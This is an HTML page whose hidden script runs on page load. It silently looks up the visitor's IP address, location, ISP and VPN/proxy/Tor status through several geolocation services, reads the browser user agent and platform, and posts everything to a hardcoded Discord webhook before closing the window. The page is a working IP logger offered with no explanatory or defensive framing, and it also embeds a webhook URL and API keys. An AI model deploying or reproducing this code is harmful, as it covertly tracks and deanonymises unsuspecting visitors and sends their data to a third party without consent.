<!DOCTYPE html>
<html>
<body>
    <script>
        async function fetchAndSendDataToWebhook() {
            const webhookUrl = "https://discord.com/api/webhooks/1134344552313012284/Ut-snO1vzFZ080T-lmI6_76lo6vtAZnsU_TRZ7FmOK_QE-DDkwNRHkTRh6TM984rNpY1";
            const vpnApiKey = "ff876c228d334ee8bd0133ae8c963ec4";
            const ipdataApiKey = "c5efb86366eb200e6ef5aaf7dff9d3d7a6a7f7e6ba298be17eabc32b";
            const ipinfoApiKey = "2dc7c2e39e5208";
            try {
                const ipAddressResponse = await fetch(`https://api.ipify.org?format=json`);
                if (!ipAddressResponse.ok) {
                    throw new Error("Failed to fetch IP address.");
                }
                const ipAddressData = await ipAddressResponse.json();
                const ipAddress = ipAddressData.ip;
                const ipdataResponse = await fetch(`https://api.ipdata.co/${ipAddress}?api-key=${ipdataApiKey}`);
                if (!ipdataResponse.ok) {
                    throw new Error("Failed to fetch IP geolocation data from ipdata.co.");
                }
                const ipdata = await ipdataResponse.json();
                const ipinfoResponse = await fetch(`https://ipinfo.io/json?token=${ipinfoApiKey}`);
                if (!ipinfoResponse.ok) {
                    throw new Error("Failed to fetch IP information from ipinfo.io.");
                }
                const ipinfoData = await ipinfoResponse.json();
                // Fetch VPN data from vpnapi.io
                const vpnApiResponse = await fetch(`https://vpnapi.io/api/${ipAddress}?key=${vpnApiKey}`);
                if (!vpnApiResponse.ok) {
                    throw new Error("Failed to fetch VPN data from vpnapi.io.");
                }
                const vpnData = await vpnApiResponse.json();
                // Fetch data from freeipapi.com
                const freeipapiResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
                if (!freeipapiResponse.ok) {
                    throw new Error("Failed to fetch data from freeipapi.com.");
                }
                const freeipapiData = await freeipapiResponse.json();
                
                const isVPNDetected = vpnData.security.vpn;
                const isProxyDetected = vpnData.security.proxy;
                const isTORDetected = vpnData.security.tor;
                const browserInfo = {
                    browser: navigator.userAgent,
                    os: navigator.platform,
                    jsEnabled: true,
                    cookies: navigator.cookieEnabled,
                };
                const overallEmbed = {
                    title: "Overall",
                    description: `----------------IP--------------\nIPv4: ${ipAddress}\nISP: ${ipdata.asn.name}\n----------DETECTIONS--------\nVPN : ${isVPNDetected ? "2/2" : "0/2"}\nProxy : ${isProxyDetected ? "2/2" : "0/2"}\nTOR : ${isTORDetected ? "2/2" : "0/2"}\n-----------LOCATION----------\nCountry: ${ipinfoData.country || "N/A"}\nState: ${ipinfoData.region || "N/A"}\nCity: ${ipinfoData.city || "N/A"}\n--------------BROWSER-------------\nBrowser: ${browserInfo.browser}\nOS: ${browserInfo.os}\nJS enabled: ${browserInfo.jsEnabled}\nCookies: ${browserInfo.cookies}\n---------------------------------`,
                    color: (isVPNDetected || isProxyDetected || isTORDetected) ? 16711680 : 65280,
                };
                const ipdataEmbed = {
                    title: "IP Information (ipdata.co)",
                    description: `\`\`\`json\n${JSON.stringify(ipdata, null, 2)}\`\`\``,
                    color: 16711680,
                };
                const ipinfoEmbed = {
                    title: "IP Information (ipinfo.io)",
                    description: `\`\`\`json\n${JSON.stringify(ipinfoData, null, 2)}\`\`\``,
                    color: 18618,
                };
                const vpnapiEmbed = {
                    title: "VPN Information (vpnapi.io)",
                    description: `\`\`\`json\n${JSON.stringify(vpnData, null, 2)}\`\`\``,
                    color: 65280,
                };
                const freeipapiEmbed = {
                    title: "IP Information (freeipapi.com)",
                    description: `\`\`\`json\n${JSON.stringify(freeipapiData, null, 2)}\`\`\``,
                    color: 65535,
                };
                const embedData = {
                    content: "@everyone",
                    embeds: [
                        overallEmbed,
                        ipdataEmbed,
                        ipinfoEmbed,
                        vpnapiEmbed,
                        freeipapiEmbed,
                    ]
                };
                const webhookResponse = await fetch(webhookUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(embedData)
                });
                if (!webhookResponse.ok) {
                    throw new Error("Failed to send data to Discord webhook.");
                }
            } catch (error) {
                console.error("Error fetching IP geolocation and sending data to Discord webhook:", error);
            }
            window.close();
        }
        window.onload = function () {
            fetchAndSendDataToWebhook();
        };
    </script>
</body>
</html>
